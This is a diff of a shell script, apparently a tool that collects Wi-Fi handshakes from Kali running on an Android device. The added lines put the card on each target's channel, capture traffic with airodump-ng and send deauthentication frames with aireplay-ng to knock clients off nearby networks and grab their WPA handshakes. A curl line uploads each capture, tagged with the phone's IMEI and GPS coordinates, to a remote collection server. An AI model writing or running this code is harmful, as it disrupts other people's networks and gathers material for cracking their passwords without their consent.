@@ -56,7 +56,6 @@ sendHandshake() {
         imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
         echo "IMEI: "$imei
         echo $1
-        echo "curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $2" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$serverAddr/task"
         curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $1" -H "Content-Type: multipart/form-data" -F "file=@./shakes/$1" http://$serverAddr/task
         if [[ $? == 0 ]]; then
                 rm ./shakes/$1
@@ -103,9 +102,23 @@ active() {
                   echo $ESSID $BSSID $BestQuality
                   continue
           fi
-          
+      
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
           
+          iwconfig $interface channel $Channel
+          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
+          pid=`echo $!`
+          aireplay-ng -a $BSSID -0 10 $interface
+          injectionExitCode=`echo $?`
+          if [[ $injectionExitCode -ne 0 ]]
+          then
+                  kill -9 $pid
+                  continue
+          fi
+          sleep 20
+          kill -9 $pid &>/dev/null
+          checkHandshakes
+          rm /home/kali/hscollector/shakes-* >/dev/null
   done < /home/kali/hscollector/shakesCollector-01.kismet.csv
   rm /home/kali/hscollector/shakes* >/dev/null
 }
